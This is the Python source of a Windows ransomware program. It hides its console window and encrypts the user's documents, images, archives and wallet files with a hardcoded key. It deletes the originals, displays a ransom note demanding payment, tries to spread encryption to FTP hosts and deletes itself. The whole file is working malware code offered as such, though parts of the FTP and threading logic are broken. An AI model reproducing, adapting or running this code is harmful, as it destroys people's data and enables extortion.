#!/usr/bin/python3.8
import ftplib
import getpass
import glob
import os
import subprocess
import time
import tkinter
from ftplib import FTP
from tkinter import messagebox

import nmap
import win32con
import win32gui
from cryptography.fernet import Fernet
import requests


passwords = []


def ftp_work():
    ftp_server = ftplib.FTP_TLS()
    user = 'anonymous'
    port = 21
    for password in passwords:
        return password
    host_list = []
    hosts = nmap.PortScanner
    h = hosts.all_hosts()
    host_list.append(h)
    time.sleep(5)
    while True:
        try:
            requests.get('https://kite.com')
            while True:
                pass_l = password
                for host in host_list:
                    try:
                        ftp_server.connect(host, port)
                        ftp_server.login(user, pass_l)
                    except Exception as e:
                        print(e)
                        continue
                    else:
                        ftp_server.prot_p()
                        time.sleep(5)

                        file_content = '*.*'
                        ftp_server.pwd()
                        key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="

                        for file in FTP.nlst(file_content):
                            k = key
                            f = Fernet(k)
                            try:
                                with open(file, "rb") as doc:
                                    file_data = doc.read()
                                    encrypted_data = f.encrypt(file_data)

                                with open(file + '.crypy', "wb") as doc:
                                    doc.write(encrypted_data)
                                    os.remove(file)
                            except Exception as e:
                                print(e)
                                pass
                        pass
        except requests.exceptions.ConnectionError:
            print(e)
            break
        except Exception as e:
            print(e)
            break
        else:
            pass


def encrypt_file():
    # This function encrypts the files with a key
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    usr = getpass.getuser()

    # Get files to encrypt
    if True:
        # Get documents in current user to encrypt
        path = 'C:/Users/' + usr
        for f_name in glob.glob(path + '/**/*.txt', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True) \
                      + glob.glob(path + '/**/*.jpeg', recursive=True) \
                      + glob.glob(path + '/**/*.png', recursive=True) \
                      + glob.glob(path + '/**/*.svg', recursive=True) \
                      + glob.glob(path + '/**/*.zip', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.wav', recursive=True) \
                      + glob.glob(path + '/**/*.mp3', recursive=True) \
                      + glob.glob(path + '/**/*.mp4', recursive=True) \
                      + glob.glob(path + '/**/*.3gp', recursive=True) \
                      + glob.glob(path + '/**/*.iso', recursive=True) \
                      + glob.glob(path + '/**/*.ico', recursive=True) \
                      + glob.glob(path + '/**/*.lnk', recursive=True) \
                      + glob.glob(path + '/**/*.ink', recursive=True) \
                      + glob.glob(path + '/**/*.xls', recursive=True) \
                      + glob.glob(path + '/**/*.dll', recursive=True) \
                      + glob.glob(path + '/**/*.html', recursive=True) \
                      + glob.glob(path + '/**/*.gz', recursive=True) \
                      + glob.glob(path + '/**/*.css', recursive=True) \
                      + glob.glob(path + '/**/*.js', recursive=True) \
                      + glob.glob(path + '/**/*.3gp', recursive=True) \
                      + glob.glob(path + '/**/*.key', recursive=True) \
                      + glob.glob(path + '/**/wallet.dat', recursive=True) \
                      + glob.glob(path + '/**/*.tar', recursive=True) \
                      + glob.glob(path + '/**/*.tgz', recursive=True) \
                      + glob.glob(path + '/**/*.rar', recursive=True) \
                      + glob.glob(path + '/**/*.java', recursive=True):
            
            k = key
            f = Fernet(k)
            try:
                with open(f_name, "rb") as file:
                    file_data = file.read()
                    encrypted_data = f.encrypt(file_data)
                with open(f_name + '.crypy', "wb") as file:
                    file.write(encrypted_data)
                    os.remove(f_name)
            except Exception as e:
                print(e)
                pass


def message():
    # this function prompts a window containing the ransom message
    import gui
    gui.gui()


def ransom_note():
    # Create ransome note .txt
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    try:
        with open(path + "RANSOM NOTE.txt", "w+") as file:
            file.write("""
WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
PAY UP
""")
    except Exception as e:
        print(e)
        pass


def show_ransom_note():
    # Open the created ransom note in notepad.exe
    usr = getpass.getuser()
    path = 'C:/Users/' + usr + '/Desktop/'
    note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
    count = 0

    while True:
        time.sleep(0.1)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if top_window == 'RANSOM NOTE - Notepad':
            pass
        else:
            note.kill()
            note = subprocess.Popen(['notepad.exe', path + 'RANSOM NOTE.txt'])
        time.sleep(10)
        count += 1
        if count == 2:
            break


def delete_ransomware():
    usr = getpass.getuser()
    ransomware_path = 'C:/Users/' + usr
    for ransomware in glob.glob(ransomware_path + '/**/ransomware.py', recursive=True):
        os.remove(ransomware)


def main():
    from threading import Thread

    # Hides the terminal console to prevent suspicion while working in background
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)

    threads = 20
    jobs = []
    for t in range(0, threads):
        thread = Thread(target=encrypt_file())
        jobs.append(thread)
    for j in jobs:
        j.start()
    for j in jobs:
        j.join()
        pass

    message()
    # ransom_note()
    # show_ransom_note()
    # ftp_work()
    # delete_ransomware()


if __name__ == "__main__":
    main()
